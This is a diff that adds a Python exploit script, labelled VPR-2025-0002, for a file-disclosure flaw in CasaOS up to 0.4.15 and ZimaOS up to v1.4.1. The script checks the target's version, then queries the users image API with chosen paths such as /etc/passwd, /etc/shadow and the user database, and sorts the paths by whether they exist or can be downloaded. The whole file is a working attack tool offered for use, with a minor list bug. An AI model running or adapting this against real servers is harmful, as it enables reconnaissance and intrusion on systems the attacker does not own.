@@ -1,0 +1,190 @@
+#!/usr/bin/env python3
+
+# Exploit:          VPR-2025-0002
+# Affects:          CasaOS <= 0.4.15, ZimaOS <= v1.4.1
+# Purpose:          File Disclosure
+# Description:      Reveals files in a given path using Casaos's users API.
+
+# Created by:       VPR
+# Created:          April 20th, 2025
+
+# Updated by:       VPR
+# Updated:          June 24th, 2025
+
+# Example Output:   {
+#                     "accessible_images_for_download": [],
+#                     "existent_paths": [
+#                       "/var/lib/casaos/1/app_order.json",
+#                       "/var/lib/casaos/1/link.json",
+#                       "/var/lib/casaos/1/system.json",
+#                       "/etc/passwd",
+#                       "/etc/shadow"
+#                     ],
+#                     "non_existent_paths": [
+#                       "/var/lib/casaos/1/shortcut.json",
+#                       "/var/lib/casaos/1/wallpaper.json",
+#                       "/var/lib/casaos/1/widgets_config.json",
+#                       "/var/lib/casaos/app_order.json",
+#                       "/var/lib/casaos/link.json",
+#                       "/var/lib/casaos/shortcut.json",
+#                       "/var/lib/casaos/system.json",
+#                       "/var/lib/casaos/wallpaper.json",
+#                       "/var/lib/casaos/widgets_config.json",
+#                       "/var/lib/casaos/db/user.db/run/does_not_exist_1",
+#                       "/etc/does_not_exist_2"
+#                     ],
+#                     "current_version": "v1.4.1"
+#                   }
+
+import argparse
+import requests
+import json
+import sys
+
+from pathlib import PosixPath
+
+from typing import (
+    List, Dict
+)
+
+VERBOSE = False
+
+def banner():
+    print(
+"""
+ _             _  _  _  _  _  _    _  _  _  _  _
+(_)           (_)(_)(_)(_)(_)(_)_ (_)(_)(_)(_)(_) _
+ (_)         (_) (_)           (_)(_)            (_)
+  (_)       (_)  (_) _  _  _  _(_)(_) _  _  _  _ (_)
+   (_)     (_)   (_)(_)(_)(_)(_)  (_)(_)(_)(_)(_)
+    (_)   (_)    (_)              (_)   (_) _
+     (_)_(_)     (_)              (_)      (_) _
+       (_)       (_)              (_)         (_) _
+                                                 (_) _
+                                                    (_)
+""", file=sys.stderr)
+
+def info():
+    print("[!] File disclosure script for CasaOS <= 0.4.15 && ZimaOS <= v1.4.1", file=sys.stderr)
+
+def pprint(*args, **kwargs):
+    if VERBOSE:
+        print(*args, **kwargs, file=sys.stderr)
+
+def is_vulnerable_casaos(version: str):
+    if version.startswith("v"):
+        return False
+
+    major, minor, patch, *_ = [int(x) for x in version.split(".")]
+    return (major <= 0 and minor <= 4 and patch <= 15)
+
+def is_vulnerable_zimaos(version: str):
+    if not version.startswith("v"):
+        return False
+
+    version = version[1::]
+    major, minor, patch = [int(x) for x in version.split(".")]
+    return (major <= 1 and minor <= 4 and patch <= 1)
+
+def is_vulnerable(version: str):
+    return is_vulnerable_casaos(version) or is_vulnerable_zimaos(version)
+
+
+class CasaRecon(object):
+    def __init__(self, target_url: str = "", target_port: str = ""):
+        self._data: Dict[str, List[str]] = {
+            'accessible_images_for_download' : [],
+            'existent_paths'                 : [],
+            'non_existent_paths'             : [],
+        }
+
+        self._target_url = target_url
+        self._target_port = target_port
+
+        self._s = requests.Session()
+
+    def __getitem__(self, key) -> List[str] | None:
+        return self._data.get(key)
+
+    def __setitem__(self, key, value) -> None:
+        self._data[key] = value
+
+    def __repr__(self) -> str:
+        return json.dumps(self._data, indent=2)
+
+    def try_get_version_current(self, endpoint: str = "/v1/sys/version/current"):
+        resp = self._s.get(f"{self._target_url}:{self._target_port}/{endpoint}")
+        pprint(f"path: {endpoint}\n{resp.status_code:}\n{resp.text:}\n")
+
+        if resp and resp.status_code == 200 and resp.text:
+            self["current_version"] = resp.text
+
+    def try_get_image(self, path: str = "/", endpoint: str="/v1/users/image"):
+        resp = self._s.get(f"{self._target_url}:{self._target_port}/{endpoint}?path={path}",)
+        pprint(f"path: {path}\n{resp.status_code:}\n{json.dumps(json.loads(resp.text), indent=2)}\n")
+
+        if resp.status_code == 200:
+            self['accessible_images_for_download'].append(path)
+        if resp.status_code == 404 and "insufficient" in resp.text.lower() or "not an image" in resp.text.lower():
+            self['existent_paths'].append(path)
+        if resp.status_code == 404 and "not exist" in resp.text.lower():
+            self['non_existent_paths'].append(path)
+
+    def perform_recon(self, root_dir: str = "", wordlist: str = "") -> str:
+        self.try_get_version_current()
+        if not is_vulnerable(self['current_version']):
+            print(f"[-] incompatible version: {self['current_version']}.", file=sys.stderr)
+            exit(1)
+
+        words = [
+            # Known paths for download
+            "var/lib/casaos/1/app_order.json",
+            "var/lib/casaos/1/link.json",
+            "var/lib/casaos/1/shortcut.json",
+            "var/lib/casaos/1/system.json",
+            "var/lib/casaos/1/wallpaper.json",
+            "var/lib/casaos/1/widgets_config.json",
+            "var/lib/casaos/app_order.json",
+            "var/lib/casaos/link.json",
+            "var/lib/casaos/shortcut.json",
+            "var/lib/casaos/system.json",
+            "var/lib/casaos/wallpaper.json",
+            "var/lib/casaos/widgets_config.json",
+            # Example path enumeration without permissions
+            "etc/passwd",
+            "etc/shadow",
+            "var/lib/casaos/db/user.db"
+            # Example path enumeration on nonexistent files
+            "run/does_not_exist_1",
+            "etc/does_not_exist_2",
+        ]
+
+        if wordlist and PosixPath(wordlist).exists():
+            with open(wordlist, "r") as f:
+                words += f.readlines()
+
+        for word in words:
+            self.try_get_image(path=f"{root_dir}/{word}")
+
+        return str(self)
+
+if __name__ == "__main__":
+    banner()
+    info()
+
+    parser = argparse.ArgumentParser( description="CasaOS <= 0.4.15 && ZimaOS <= v1.4.1 File disclosure script" )
+    parser.add_argument( "-u", "--url",      default="http://127.0.0.1", help="Target url              (default http://127.0.0.1)" )
+    parser.add_argument( "-p", "--port",     default=80,                 help="Target port             (default = 80)"             )
+    parser.add_argument( "-r", "--root-dir", default="",                 help="Root directory to enum  (default = \"\")"           )
+    parser.add_argument( "-w", "--wordlist", default=None,               help="/path/to/wordlist.txt   (default = None)"           )
+    parser.add_argument( "-v", "--verbose",  default=False,              action="store_true"                                       )
+    args = parser.parse_args()
+
+    if args.verbose:
+        VERBOSE=1
+
+    print(f"[+] Targeting {args.url}:{args.port} ...", file=sys.stderr)
+    recon = CasaRecon(target_url=args.url, target_port=args.port)
+    print(f"[+] Results:\n", file=sys.stderr)
+    print(recon.perform_recon(root_dir=args.root_dir, wordlist=args.wordlist))
+
